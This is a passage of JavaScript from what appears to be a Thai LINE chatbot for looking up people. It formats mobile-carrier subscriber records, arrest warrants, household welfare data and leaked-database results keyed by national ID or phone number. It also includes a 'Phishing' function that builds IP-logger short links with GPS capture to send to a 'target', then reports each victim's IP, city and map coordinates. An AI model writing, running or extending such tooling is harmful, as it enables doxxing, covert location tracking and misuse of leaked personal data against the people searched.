        .map(item =>
          typeof item === 'string'
            ? item
            : item?.value
        )
        .filter(Boolean);

    const name = [
      d.customerTitle,
      d.customerFirstName,
      d.customerLastName
    ]
      .filter(Boolean)
      .join(' ') ||
      customerInfo.name ||
      '-';

    const type =
      /prepaid|เติมเงิน/i.test(
        `${d.subscriberType || ''} ${d.fromPackageGroupType || ''}`
      )
        ? 'เติมเงิน'
        : 'รายเดือน';

    const status =
      String(d.subscriberStatus || '').toUpperCase() === 'A'
        ? '✅ Active'
        : (d.subscriberStatus || '-');

    const packageItems =
      Array.isArray(d.mainPackages)
        ? d.mainPackages
        : [];

    const packageContents = [];

    if (packageItems.length) {

      packageItems.forEach((p, index) => {

        packageContents.push({
          type: 'text',
          text: `${index + 1}. ${p.description || '-'}`,
          size: 'sm',
          color: '#334155',
          wrap: true,
          margin: index === 0 ? 'none' : 'sm'
        });

      });

      if (packageItems[0]?.startDateTime) {

        packageContents.push({
          type: 'text',
          text: `วันที่เริ่ม: ${packageItems[0].startDateTime}`,
          size: 'sm',
          color: '#64748B',
          wrap: true,
          margin: 'md'
        });

      }

    } else {

      packageContents.push({
        type: 'text',
        text: 'ไม่พบแพ็กเกจหลัก',
        size: 'sm',
        color: '#64748B'
      });

    }


    const deviceContents = [
      {
        type: 'text',
        text: `SIM Number: ${d.simCardNumber || '-'}`,
        size: 'sm',
        color: '#334155',
        wrap: true
      }
    ];

    deviceItems.forEach(value => {

      deviceContents.push({
        type: 'text',
        text: `• ${value}`,
        size: 'sm',
        color: '#334155',
        wrap: true,
        margin: 'sm'
      });

    });


    const packageCopyText =
      packageItems.length
        ? packageItems
            .map(p => p.description || '-')
            .join('\n')
        : '-';

    const deviceCopyText =
      deviceItems.length
        ? deviceItems.join('\n')
        : '-';


    return {
      type: 'flex',
      altText: `DTAC ${query}`,

      contents: {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0F172A',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: `[ ${query} ]`,
              color: '#FFFFFF',
              weight: 'bold',
              size: 'xl'
            },

            {
              type: 'text',
              text: 'DTAC CUSTOMER INFORMATION',
              color: '#94A3B8',
              size: 'xs',
              margin: 'sm'
            }
          ]
        },

        body: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '18px',
          spacing: 'md',

          contents: [

            // =============================================
            // บุคคล
            // =============================================
            {
              type: 'text',
              text: " ข้อมูลสมาชิก",
              weight: 'bold',
              size: 'md',
              color: '#0F172A'
            },

            {
              type: 'text',
              text:
                `◇ ชื่อที่ระบุ
  ${name}\n` +
                `ID: ${d.customerIDNumber || detail.idCheck?.idNumber || '-'}`,
              wrap: true,
              size: 'sm',
              color: '#334155'
            },

            {
              type: 'separator',
              margin: 'md'
            },

            // =============================================
            // หมายเลข
            // =============================================
            {
              type: 'text',
              text: " ข้อมูลหมายเลข",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md'
            },

            {
              type: 'text',
              text:
                `ประเภท: ${type}\n` +
                `อายุการใช้งาน: ${d.aouText || '-'}\n` +
                `สถานะ: ${status}\n` +
                `◇ กลุ่มของลูกค้า
  ${detail.segment?.segment || '-'}\n` +
                `◇ หมายเลขสมาชิก
  ${d.customerNumber || d.subscriberNumber || '-'}\n` +
                `◇ สถานะในระบบ
  ${d.subscriberStatus || '-'}\n` +
                `NBTC: ${nbtc.result || '-'}`,
              wrap: true,
              size: 'sm',
              color: '#334155'
            },

            {
              type: 'separator',
              margin: 'md'
            },

            // =============================================
            // Package
            // =============================================
            {
              type: 'text',
              text: " แพ็กเกจหลัก",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md'
            },

            ...packageContents,

            {
              type: 'separator',
              margin: 'md'
            },

            // =============================================
            // Device
            // =============================================
            {
              type: 'text',
              text: " ▸ รายละเอียดอุปกรณ์และ SIM",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md'
            },

            ...deviceContents
          ]
        },

        footer: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '16px',

          contents: [
            {
              type: 'button',
              style: 'primary',
              height: 'sm',

              action: {
                type: 'clipboard',
                label: 'คัดลอกข้อมูล',

                clipboardText:
                  `DTAC ${query}\n` +
                  `ชื่อ: ${name}\n` +
                  `ID: ${d.customerIDNumber || detail.idCheck?.idNumber || '-'}\n\n` +

                  `ข้อมูลหมายเลข\n` +
                  `ประเภท: ${type}\n` +
                  `อายุการใช้งาน: ${d.aouText || '-'}\n` +
                  `สถานะ: ${status}\n` +
                  `กลุ่มลูกค้า: ${detail.segment?.segment || '-'}\n` +
                  `เลขสมาชิก: ${d.customerNumber || d.subscriberNumber || '-'}\n` +
                  `สถานะระบบ: ${d.subscriberStatus || '-'}\n` +
                  `NBTC: ${nbtc.result || '-'}\n\n` +

                  `แพ็กเกจหลัก\n${packageCopyText}\n\n` +

                  `SIM Number: ${d.simCardNumber || '-'}\n` +
                  `${deviceCopyText}`
              }
            }
          ]
        }
      }
    };
  }


  return {
    type: 'text',
    text: '❌ ไม่พบข้อมูล DTAC'
  };
}

function buildCallerInfoFlex(number, location, details) {
  const cleanNumber = String(number || '').replace(/\s+/g, '');

  let carrier = 'UNKNOWN';
  let color = '#0F172A';
  let logoUrl = null;

  if (/AIS/i.test(details)) {
carrier = 'AIS';
color = '#16A34A';
logoUrl = 'https://cdn.phototourl.com/free/2026-05-21-b31499f0-524b-40e0-a258-035914346614.png';

} else if (/DTAC/i.test(details)) {
carrier = 'DTAC';
color = '#2563EB';
logoUrl = 'https://cdn.phototourl.com/free/2026-05-21-9046b96b-f100-41b1-832d-637306a7c763.png';

} else if (/TRUE/i.test(details)) {
carrier = 'TRUE';
color = '#DC2626';
logoUrl = 'https://cdn.phototourl.com/free/2026-05-21-fa0e66e0-61be-4595-92f7-bec6bae9e8bb.png';
}

  const headerContents = [
    {
      type: 'text',
      text: " ข้อมูลเครือข่าย",
      color: '#FFFFFF',
      weight: 'bold',
      size: 'lg'
    },
    {
      type: 'text',
      text: carrier,
      color: '#E5E7EB',
      size: 'sm',
      margin: 'sm'
    }
  ];

  if (logoUrl) {
    headerContents.unshift({
      type: 'image',
      url: logoUrl,
      size: 'sm',
      aspectMode: 'fit',
      align: 'start'
    });
  }

  return {
    type: 'flex',
    altText: `ข้อมูลเครือข่าย ${cleanNumber}`,
    contents: {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: color,
        paddingAll: '16px',
        contents: headerContents
      },
            body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          infoLine('หมายเลข', cleanNumber || '-'),
          infoLine('ตำแหน่ง', location || '-'),
          infoLine("เครือข่ายที่ระบุ", carrier),
          infoLine('รายละเอียด', details || '-')
        ]
      },

      footer: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '14px',
        contents: [
          {
            type: 'button',
            style: 'primary',
            height: 'sm',
            color: color,
            action: {
              type: 'clipboard',
              label: 'คัดลอกข้อมูล',
              clipboardText:
                `📡 ข้อมูลเครือข่าย\n` +
                `หมายเลข: ${cleanNumber || '-'}\n` +
                `ตำแหน่ง: ${location || '-'}\n` +
                `เครือข่าย: ${carrier || '-'}\n` +
                `รายละเอียด:\n${details || '-'}`
            }
          }
        ]
      }
    }
  };
}

function formatCrime(data, keyword = '') {
  try {
    if (!data || data.status === false || data.status === 'error') {
      return '❌ ไม่พบข้อมูลหมายจับ';
    }

    const list = Array.isArray(data.data) ? data.data : [];
    if (!list.length) {
      return '❌ ไม่พบข้อมูลหมายจับ';
    }

    const pickLine = (text, label) => {
      const regex = new RegExp(`${label}\\s*:\\s*([^\\n\\\\]+)`, 'i');
      const match = String(text).match(regex);
      return match ? match[1].trim() : '-';
    };

    const sorted = [...list].reverse();

    let msg = `✅พบข้อมูลหมายจับ\n`;

    sorted.forEach((item, index) => {
      const text = String(item || '');

      const warrant = pickLine(text, 'WARRANT');
      const crimes = pickLine(text, 'CRIMES');
      const charge = pickLine(text, 'CHARGE');
      const id = pickLine(text, 'ID');
      const fullname = pickLine(text, 'FULLNAME');
      const police = pickLine(text, 'POLICE');
      const tell = pickLine(text, 'TELL');
      const status = pickLine(text, 'STATUS');

      msg += `\n${index + 1}️⃣\n`;
      msg += `◇ หมายเลขหมายจับ
  ${warrant}\n`;
      msg += `◇ หมายเลขคดี
  ${crimes}\n`;
      msg += `◇ หมายเลขบัตรประชาชน
  ${id !== '-' ? id : keyword}\n`;
      msg += `◇ ชื่อที่ระบุ
  ${fullname}\n`;
      msg += `◇ รายการข้อหา
  ${charge}\n`;
      msg += `◇ เจ้าของคดีที่ระบุ
  ${police}\n`;
      msg += `◇ เบอร์สำหรับติดต่อ
  ${tell}\n`;
      msg += `◇ สถานะของหมายจับ
  ${status}\n`;
    });

    return msg;
  } catch (err) {
    console.error('formatCrime error:', err);
    return '❌ แปลงข้อมูลหมายจับไม่สำเร็จ';
  }
}

function limitLineMessage(msg) {
  // Text is divided at delivery time so result fields are never cut off here.
  return String(msg == null ? '' : msg);
}

async function fetchLeakOsintApi(query) {
  if (!LEAKOSINT_API_TOKEN) {
    throw new Error('ยังไม่ได้ตั้งค่า LEAKOSINT_API_TOKEN');
  }

  const { data } = await axios.post(
    LEAKOSINT_API_URL,
    {
      token: LEAKOSINT_API_TOKEN,
      request: query,
      limit: 100,
      lang: 'th',
      type: 'json'
    },
    {
      headers: { 'Content-Type': 'application/json' },
      timeout: 120000
    }
  );

  return data;
}

function formatLeakOsintResult(result, query, page = 1) {
  if (!result || typeof result !== 'object') {
    return '❌ API ส่งข้อมูลไม่ถูกต้อง';
  }

  if (result['Error code']) {
    return `❌ LeakOSINT: ${result['Error code']}`;
  }

  const list = result.List;
  if (!list || typeof list !== 'object') {
    return limitLineMessage(JSON.stringify(result, null, 2));
  }

  const isPhoneQuery = /^\+?\d{8,}$/.test(query.replace(/[\s()-]/g, ''));
  const databases = Object.entries(list).filter(([databaseName]) =>
    isPhoneQuery || databaseName.trim().toLowerCase() !== 'thailand people database'
  );
  const totalPages = Math.max(1, ...databases.map(([, database]) => {
    const rows = Array.isArray(database?.Data) ? database.Data : [];
    return rows.length;
  }));

  if (page > totalPages) {
    return `❌ ไม่พบหน้าที่ ${page} (มีทั้งหมด ${totalPages} หน้า)`;
  }

  const sections = [` ผลค้นหา LeakOSINT (หน้า ${page}/${totalPages})
◇ คำที่ใช้ค้นหา
  ${query}`];

  for (const [databaseName, database] of databases) {
    const infoLeak = String(database?.InfoLeak || '').trim();
    const rows = Array.isArray(database?.Data) ? database.Data : [];
    const row = rows[page - 1];
    if (!row) continue;
    const lines = [` ${databaseName}`];

    if (infoLeak) lines.push(infoLeak);
    lines.push('', `รายการที่ ${page}`);
    if (row && typeof row === 'object') {
      for (const [key, value] of Object.entries(row)) {
        const printable = value && typeof value === 'object'
          ? JSON.stringify(value)
          : String(value ?? '-');
        lines.push(`${key}: ${printable}`);
      }
    } else {
      lines.push(String(row));
    }

    sections.push(lines.join('\n'));
  }

  return limitLineMessage(sections.join("\n\n────────────\n\n"));
}

async function createPhishingShortLink(targetUrl) {
  try {
    const response = await axios.post(
      `https://api.iplogger.org/create/shortlink/?token=${PHISHING_LOG_API_KEY}`,
      {
        destination: targetUrl,
        domain: PHISHING_LOG_DOMAIN,
        gps: 1,
        smart: 1,
        privacy: 1,
        notify: 1
      },
      { headers: { 'Content-Type': 'application/json' } }
    );

    const result = response.data?.result;
    if (!result?.id || !result?.shortlink) {
      return '❌ ไม่สามารถสร้าง short link ได้';
    }

    phishingLoggerMap[result.id] = {
      id: result.id,
      shortlink: result.shortlink,
      creation_date: result.creation_date
    };

    return `🎣 Phishing

╭ ✅ สร้างลิงก์เรียบร้อย
├ 📂 รหัส ID ตรวจสอบ: ${result.id}
╰ 🔗 ลิงก์ส่งให้เป้าหมาย: ${result.shortlink}

╭ ⚠️ หมายเหตุ
├ ให้นำรหัส ID ข้างต้นไปตรวจสอบ
╰ ใช้คำสั่ง: chphis@${result.id}`;
  } catch (error) {
    return '❌ Failed to create short link: ' + (error.response?.data?.message || error.message);
  }
}

async function showPhishingLoggerVisitors(id) {
  const logger = phishingLoggerMap[id] || { id };

  try {
    const response = await axios.get('https://api.iplogger.org/logger/visitors/', {
      params: {
        id: logger.id,
        token: PHISHING_LOG_API_KEY,
        hide_bots: 1,
        limit: 100
      },
      headers: { 'Content-Type': 'application/json' }
    });

    const visits = response.data?.result || [];

console.log('VISIT DATA =>');
console.log(JSON.stringify(visits[0], null, 2));
    if (!visits.length) return " ยังไม่มีคนกดลิงก์หรือถูกกรองหมดแล้ว";

    let msg = " Phishing\n\n";

visits.forEach((visit, idx) => {
  msg += `• ลำดับ ${idx + 1}\n`;
  msg += `• IP: ${visit.ip || '-'}\n`;
  msg += `• เวลาเข้าชม: ${formatPhishingVisitTime(visit)}\n`;
  msg += `• ประเทศ: ${visit.country || '-'}\n`;
  msg += `• เครือข่าย: ${visit.isp || '-'}\n`;
  msg += `• จังหวัด: ${visit.state || '-'}\n`;
  msg += `• เมือง: ${visit.city || '-'}\n`;
  msg += `• Browser: ${visit.browser || '-'}\n`;
  msg += `• Platform: ${visit.platform || '-'}\n`;
  msg += `• Referer: ${visit.referer || '-'}\n`;
  
  if (visit.lat && visit.lng) {
    msg += `• พิกัด: ${visit.lat},${visit.lng}\n`;
    msg += `• Google map: https://www.google.com/maps?q=${visit.lat},${visit.lng}\n\n`;
  } else {
    msg += `• พิกัด: -

`;
  }
});

    return limitLineMessage(msg);
  } catch (err) {
    return '❌ Failed to get visitor data: ' + (err.response?.data?.message || err.message);
  }
}

function formatPhishingVisitTime(visit) {
  const raw = visit?.created_at ||
    visit?.creation_date ||
    visit?.date ||
    visit?.datetime ||
    visit?.time ||
    visit?.timestamp ||
    visit?.visit_time ||
    visit?.first_seen ||
    visit?.last_seen ||
    '';
  if (!raw) return '-';

  const numeric = typeof raw === 'number' || /^\d{10,13}$/.test(String(raw));
  const date = numeric
    ? new Date(String(raw).length === 10 ? Number(raw) * 1000 : Number(raw))
    : new Date(raw);

  if (!Number.isNaN(date.getTime())) {
    return date.toLocaleString('th-TH', {
      timeZone: 'Asia/Bangkok',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  }

  return String(raw);
}

function limitAllSection(text, max = 1000) {
  // Keep full sections; delivery batches long reports without deleting text.
  return String(text || '-');
}

async function fetchPiLookup(pid) {
  const { data } = await axios.get('http://45.141.27.249:8000/api', {
    params: { pid },
    timeout: 45000
  });
  return data;
}

function piValue(value, fallback = '-') {
  if (value === null || value === undefined) return fallback;
  const text = String(value).trim();
  if (!text || text.toLowerCase() === 'null') return fallback;
  return text;
}

function piFullName(person) {
  const prefix = piValue(person?.prefix_name, '');
  const name = piValue(person?.name, '');
  const surname = piValue(person?.surname, '');
  return `${prefix}${name}${surname ? ` ${surname}` : ''}`.trim() || '-';
}

function piGender(value) {
  if (value === 'ช') return 'ชาย';
  if (value === 'ญ') return 'หญิง';
  return piValue(value);
}

function piBirthdate(value) {
  const text = piValue(value, '');
  if (!/^\d{8}$/.test(text)) return text || '-';
  return `${text.slice(6, 8)}/${text.slice(4, 6)}/${text.slice(0, 4)}`;
}

function piYesNo(value) {
  return Number(value) === 1 || value === true || value === 'Y' ? 'ใช่' : 'ไม่ใช่';
}

function piRegistered(value) {
  return value === 'Y' ? 'ลงทะเบียนแล้ว' : 'ไม่ได้ลงทะเบียน';
}

function piSelfReliance(value) {
  return Number(value) === 1 ? 'ได้' : 'ไม่ได้';
}

function piMoney(value) {
  const num = Number(value);
  if (!Number.isFinite(num)) return piValue(value);
  return num.toLocaleString('th-TH');
}

function piNumberIcon(index) {
  const icons = ["1.", "2.", "3.", "4.", "5.", "6.", "7.", "8.", "9.", '🔟'];
  return icons[index] || `${index + 1}.`;
}

function piUniqueMembers(rows) {
  const seen = new Set();
  return (Array.isArray(rows) ? rows : []).filter(item => {
    const key = String(item?.NID || item?._id || JSON.stringify(item));
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function formatPiLookup(apiRes, pid) {
  if (!apiRes || apiRes.status !== 'ok' || !apiRes.data) {
    return `❌ ไม่พบข้อมูลสำหรับเลขบัตร ${pid}`;
  }

  const data = apiRes.data;
  const person = data.api_new || {};
  const oldAddress = data.api_old || {};
  const survey = data.housesurvey_data || (Array.isArray(data.family_surveys) ? data.family_surveys[0] : {}) || {};
  const memberSource = [data.family_house_members, data.family_members, data.house_data]
    .find(rows => Array.isArray(rows) && rows.length > 0);
  const members = piUniqueMembers(memberSource);

  if (!person.NID && !oldAddress.NID && !members.length) {
    return `❌ ไม่พบข้อมูลสำหรับเลขบัตร ${pid}`;
  }

  const addressNum = piValue(oldAddress.address_num, piValue(survey.address_num));
  const moo = piValue(oldAddress.moo, piValue(survey.moo));
  const villageName = piValue(oldAddress.village_name, piValue(survey.village_name));
  const tambolName = piValue(oldAddress.tumbol_name, piValue(survey.tambol_name));
  const amphurName = piValue(oldAddress.ampuhur_name, piValue(survey.amphur_name));
  const provinceName = piValue(oldAddress.province_name, piValue(survey.province_name));

  let msg = `▸ รายละเอียดของบุคคล
◇ หมายเลขบัตรประชาชน
  ${piValue(person.NID, pid)}
◇ ชื่อและนามสกุล
  ${piFullName(person)}
• เพศ: ${piGender(person.gender)}
• อายุ: ${piValue(person.ebmn_age)} ปี
◇ วันเดือนปีเกิด
  ${piBirthdate(person.birthdate)}
• ศาสนา: ${piValue(person.religion)}
• การศึกษา: ${piValue(person.education)}
• อาชีพ: ${piValue(person.occupation)}
• ความสัมพันธ์ในบ้าน: ${piValue(person.relation)}
◇ ข้อมูลสิทธิการรักษา
  ${piValue(person.main_right)}
• ผู้พิการ: ${piYesNo(person.disabled)}
• ผู้สูงอายุลงทะเบียน: ${piRegistered(person.elderly_registered)}
• ช่วยเหลือตัวเองได้: ${piSelfReliance(person.self_reliance)}

▸ รายละเอียดสถานที่อยู่
• บ้านเลขที่: ${addressNum}
• หมู่: ${moo}
• หมู่บ้าน: ${villageName}
• ตำบล: ${tambolName}
• อำเภอ: ${amphurName}
◇ จังหวัดที่ระบุ
  ${provinceName}`;

  if (members.length) {
    msg += `

สมาชิกในครัวเรือน`;
    members.forEach((member, index) => {
      const isLast = index === members.length - 1;
      const prefix = isLast ? "• " : "• ";
      const childPrefix = isLast ? '  ' : "  ";
      const hospital = piValue(member.main_hospital, '');
      const elderlyAlw = Number(member.dla_alw || 0);

      msg += `\n${prefix} ${piNumberIcon(index)} ${piFullName(member)}
${childPrefix}◇ หมายเลขบัตร
  ${piValue(member.NID)}
${childPrefix}• เพศ: ${piGender(member.gender)}
${childPrefix}• อายุ: ${piValue(member.ebmn_age)} ปี`;

      if (member.elderly_registered === 'Y') {
        msg += `\n${childPrefix}• ผู้สูงอายุ: ${piRegistered(member.elderly_registered)}`;
      }
      if (elderlyAlw > 0) {
        msg += `\n${childPrefix}• เบี้ยผู้สูงอายุ: ${piMoney(elderlyAlw)} บาท`;
      }

      msg += `\n${childPrefix}• อาชีพ: ${piValue(member.occupation)}
${childPrefix}• สถานะ: ${piValue(member.relation)}
${childPrefix}◇ ข้อมูลสิทธิการรักษา
  ${piValue(member.main_right)}`;

      if (hospital) {
        msg += `\n${childPrefix}◇ โรงพยาบาลหลักตามสิทธิ
  ${hospital}`;
      } else {
        msg += `\n${childPrefix}• การศึกษา: ${piValue(member.education)}`;
      }
    });
  }

  const mpi = Number(survey.MPI_score || 0);
  msg += `

▸ ภาพรวมข้อมูลครัวเรือน
• จำนวนสมาชิกในบ้าน: ${piValue(survey.HOUSE_MEMBER_CNT, members.length || '-')} คน
• รายได้ครัวเรือนต่อปี: ${piMoney(survey.HH_income)} บาท
• รายได้เฉลี่ยต่อคน: ${piMoney(survey.avg_individual_income)} บาท/ปี
• ประเภทบ้าน: ${piValue(survey.house_type)}
• ผู้พึ่งพิงผู้สูงอายุ: ${piValue(survey.dependent_elderly_cnt, 0)} คน
• เงินออมต่อปี: ${piMoney(survey.yearly_savings)} บาท
• คะแนนความยากจน (MPI): ${piValue(survey.MPI_score, 0)}
• สถานะความเป็นอยู่: ${mpi > 0 ? 'พบตัวชี้วัดความยากจน' : 'ไม่พบตัวชี้วัดความยากจน'}`;

  return limitLineMessage(msg);
}

function dplusValue(value) {
  if (value === null || value === undefined) return '-';
  const text = String(value).trim();
  return text || '-';
}

function formatDPlusCustomers(data, keyword) {
  const response = data && typeof data === 'object' ? data : {};
  const customers = Array.isArray(data) ? data : response.data;

  if (response.code !== undefined && Number(response.code) !== 1) {
    return `❌ ค้นหาข้อมูลไม่สำเร็จ: ${dplusValue(response.message)}`;
  }

  if (!Array.isArray(customers) || customers.length === 0) {
    return `❌ ไม่พบข้อมูลลูกค้าสำหรับเบอร์ ${keyword}`;
  }

  const msg = ` พบข้อมูล ${customers.length} รายการ${response.message ? ` (${dplusValue(response.message)})` : ''}\n` +
    customers.map((record, index) => {
      const item = record && typeof record === 'object' ? record : {};
      const address = [
        dplusValue(item.detail_address || item.address || item.address_no),
        item.district_name || item.district ? `ต.${dplusValue(item.district_name || item.district)}` : '',
        item.city_name || item.amphure ? `อ.${dplusValue(item.city_name || item.amphure)}` : '',
        item.province_name || item.province ? `จ.${dplusValue(item.province_name || item.province)}` : '',
        item.postal_code || item.zipcode ? dplusValue(item.postal_code || item.zipcode) : ''
      ].filter(Boolean).join(' ');

      return `• ─ รายการ ${index + 1}\n` +
        `◇ ชื่อที่ระบุ
  ${dplusValue(item.name)}\n` +
        `◇ เบอร์โทรที่ระบุ
  ${dplusValue(item.phone || keyword)}\n` +
        `◇ รายละเอียดที่อยู่
  ${address || '-'}\n` +
        `• รหัสตำบล: ${dplusValue(item.district_code)}`;
    }).join('\n\n');

  return limitLineMessage(msg);
}

let storeListCache = null;
let storeListCacheAt = 0;

async function fetchStoreListApi() {

  const CACHE_MS =
    10 * 60 * 1000; // 10 นาที


  // ใช้ cache ถ้ายังไม่หมดอายุ
  if (
    Array.isArray(storeListCache) &&
    Date.now() - storeListCacheAt < CACHE_MS
  ) {
    return storeListCache;
  }


  const url =
    process.env.STORE_API_URL;

  const apiKey =
    process.env.STORE_API_KEY;


  if (!url) {
    throw new Error(
      'STORE_API_URL not configured'
    );
  }


  if (!apiKey) {
    throw new Error(
      'STORE_API_KEY not configured'
    );
  }


  const response =
    await axios.post(
      url,
      null,
      {
        timeout: 45000,

        headers: {
          Accept:
            'application/json, text/plain, */*',

          'Content-Type':
            'application/json',

          'X-Api-Key':
            apiKey
        }
      }
    );


  const stores =
    Array.isArray(
      response.data?.store
    )
      ? response.data.store
      : [];


  storeListCache =
    stores;

  storeListCacheAt =
    Date.now();


  return stores;
}

function searchStores(
  stores,
  keyword
) {

  const q =
    String(keyword || '')
      .trim()
      .toLowerCase();


  if (!q) {
    return [];
  }


  // =====================================
  // ถ้าค้นด้วยตัวเลขล้วน
  // ให้ค้น STORE_ID เท่านั้น
  // รองรับ 5 / 05 / 005 / 00005
  // =====================================
  if (/^\d+$/.test(q)) {

    const normalizedQuery =
      q.replace(
        /^0+(?=\d)/,
        ''
      );


    return stores.filter(store => {

      const storeId =
        String(
          store?.STORE_ID || ''
        )
          .trim()
          .replace(
            /^0+(?=\d)/,
            ''
          );


      return (
        storeId ===
        normalizedQuery
      );
    });
  }


  // =====================================
  // ถ้าไม่ใช่ตัวเลข
  // ค้นจากชื่อ / LINE / ที่อยู่ / จังหวัด
  // =====================================
  return stores.filter(store => {

    const name =
      String(
        store?.STORE_NAME || ''
      )
        .trim()
        .toLowerCase();


    const lineId =
      String(
        store?.STORE_LINE_ID || ''
      )
        .trim()
        .toLowerCase();


    const address =
      String(
        store?.STORE_ADDRESS || ''
      )
        .trim()
        .toLowerCase();


    const province =
      String(
        store?.STORE_PROVINCE || ''
      )
        .trim()
        .toLowerCase();


    return (
      name.includes(q) ||
      lineId.includes(q) ||
      address.includes(q) ||
      province.includes(q)
    );
  });
}

function formatStoreSearchResult(
  stores,
  keyword
) {

  if (
    !Array.isArray(stores) ||
    stores.length === 0
  ) {

    return (
` ค้นหาสาขา
◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}
❌ ไม่พบข้อมูล`
    );
  }


  // ป้องกันข้อความ LINE ยาวเกิน
  const MAX_RESULTS = 15;

  const selected =
    stores.slice(
      0,
      MAX_RESULTS
    );


  const items =
    selected.map(
      (store, index) => {

        const rawId =
  String(
    store?.STORE_ID || ''
  ).trim();

const id =
  /^\d+$/.test(rawId)
    ? rawId.padStart(5, '0')
    : (rawId || '-');

        const name =
          String(
            store?.STORE_NAME || '-'
          ).trim();

        const lineId =
          String(
            store?.STORE_LINE_ID || '-'
          ).trim();

        const address =
          String(
            store?.STORE_ADDRESS || '-'
          )
            .replace(/\s+/g, ' ')
            .trim();

        const province =
          String(
            store?.STORE_PROVINCE || '-'
          ).trim();


        return (
` รายการที่ ${index + 1}
◇ รหัสประจำสาขา
  ${id}
◇ ชื่อของสาขา
  ${name}
 LINE : ${lineId}
◇ รายละเอียดที่อยู่
  ${address}
◇ จังหวัดที่ระบุ
  ${province}`
        );
      }
    )
    .join(
      "\n\n────────────\n\n"
    );


  let header =
` ▸ รายละเอียดของสาขา
◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}
✅ พบทั้งหมด ${stores.length} รายการ
────────────`;


  if (
    stores.length >
    MAX_RESULTS
  ) {

    header +=
`
 แสดง ${MAX_RESULTS} รายการแรก`;
  }


  return limitLineMessage(
`${header}

${items}`
  );
}

async function fetchTrueSearchApi(keyword) {
  const response = await axios.get(
    'https://api-true.obtimus-team.cc/search',
    {
      params: {
        token: process.env.TRUE_SEARCH_TOKEN,
        key: keyword
      },
      timeout: 30000
    }
  );

  if (!response.data?.ok) {
    throw new Error('TRUE API returned unsuccessful result');
  }

  return response.data;
}

function formatTrueSearchResult(
  result,
  keyword,
  member
) {

  const data = result?.data || {};

  const isCitizenId =
    /^\d{13}$/.test(keyword);

  const isPassport =
    /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z0-9]{6,12}$/.test(keyword);

  const isFullName =
    /^[ก-๙A-Za-z.'-]+\s+[ก-๙A-Za-z.' -]+$/.test(keyword);

  if (
  isCitizenId ||
  isPassport ||
  isFullName
) {
    const customers = Array.isArray(data.customer)
      ? data.customer
      : [];

    if (customers.length === 0) {
      return `❌[${keyword}]\nไม่พบข้อมูลลูกค้า`;
    }

    // หา customer ที่ตรงกับเลขบัตร
    const customer =
  customers.find(
    c =>
      String(c?.idNumber || '')
        .trim()
        .toUpperCase() ===
      String(keyword)
        .trim()
        .toUpperCase()
  ) || customers[0];

    // รวม assetList จาก customer ทุกชุด
    const allAssets = [];

    customers.forEach(c => {
      if (Array.isArray(c?.assetList)) {
        allAssets.push(...c.assetList);
      }
    });

    // ลบรายการซ้ำ โดยใช้ assetRowId
    const seen = new Set();

    const assets = allAssets.filter(item => {
      const key =
        item?.assetRowId ||
        [
          item?.serviceId,
          item?.productLine,
          item?.startDate,
          item?.ban
        ].join('|');

      if (seen.has(key)) {
        return false;
      }

      seen.add(key);
      return true;
    });

    // ------------------------------
    // Helper
    // ------------------------------

    const thaiDate = value => {
      if (!value) return '-';

      const months = {
        Jan: 'ม.ค.',
        Feb: 'ก.พ.',
        Mar: 'มี.ค.',
        Apr: 'เม.ย.',
        May: 'พ.ค.',
        Jun: 'มิ.ย.',
        Jul: 'ก.ค.',
        Aug: 'ส.ค.',
        Sep: 'ก.ย.',
        Oct: 'ต.ค.',
        Nov: 'พ.ย.',
        Dec: 'ธ.ค.'
      };

      const clean = String(value)
        .replace(',', '')
        .trim();

      const match = clean.match(
        /^(\d{1,2})\s+([A-Za-z]{3})\s+(\d{4})$/
      );

      if (match) {
        const [, day, month, year] = match;

        return `${Number(day)} ${months[month] || month} ${year}`;
      }

      return value;
    };

    const statusIcon = status => {
      const s = String(status || '').toLowerCase();

      if (s === 'active') return '🟢';
      if (s === 'preactive') return '🟡';

      return '🔴';
    };

    const paymentText = type => {
      if (type === 'Prepay') return 'เติมเงิน';
      if (type === 'Postpay') return 'รายเดือน';

      return type || '-';
    };

    const cleanPackage = item => {
      const plan = String(item?.pricePlan || '').trim();

      if (!plan) return '-';

      // HELLO 2025
      if (/HELLO\s*2025/i.test(plan)) {
        return 'HELLO 2025';
      }

      // True ID Plus Sim
      if (/True\s*ID\s*Plus\s*Sim/i.test(plan)) {
        return 'True ID Plus Sim';
      }

      return plan
        .replace(/^\[[^\]]+\]\s*/, '')
        .replace(/^[A-Z0-9_-]+-TMH\s+Prepay\s+/i, '')
        .replace(/\s*\(recognition\)\s*$/i, '')
        .trim();
    };

    // ------------------------------
    // แบ่งประเภทบริการ
    // ------------------------------

    const currentMobile = assets.filter(item =>
      item?.productLine === 'True Mobile' &&
      item?.serviceId &&
      String(item?.status || '').toLowerCase() === 'active' &&
      (
        item?.productType === 'Prepay' ||
        item?.productType === 'Postpay'
      )
    );

    const mobileHistory = assets.filter(item =>
      item?.productLine === 'True Mobile' &&
      item?.serviceId &&
      String(item?.status || '').toLowerCase() !== 'active' &&
      (
        item?.productType === 'Prepay' ||
        item?.productType === 'Postpay'
      )
    );

    const trueOnline = assets.filter(item =>
      item?.productLine === 'True Online' &&
      item?.serviceId
    );

    const trueVisions = assets.filter(item =>
      item?.productLine === 'True Visions' &&
      item?.serviceId
    );

    // ------------------------------
    // ข้อมูลลูกค้า
    // ------------------------------

    const fullName = [
  customer?.firstName,
  customer?.lastName
]
  .filter(Boolean)
  .join(' ')
  .trim() || '-';

const searchTitle =
  isFullName
    ? fullName
    : (customer?.idNumber || keyword);


let text =
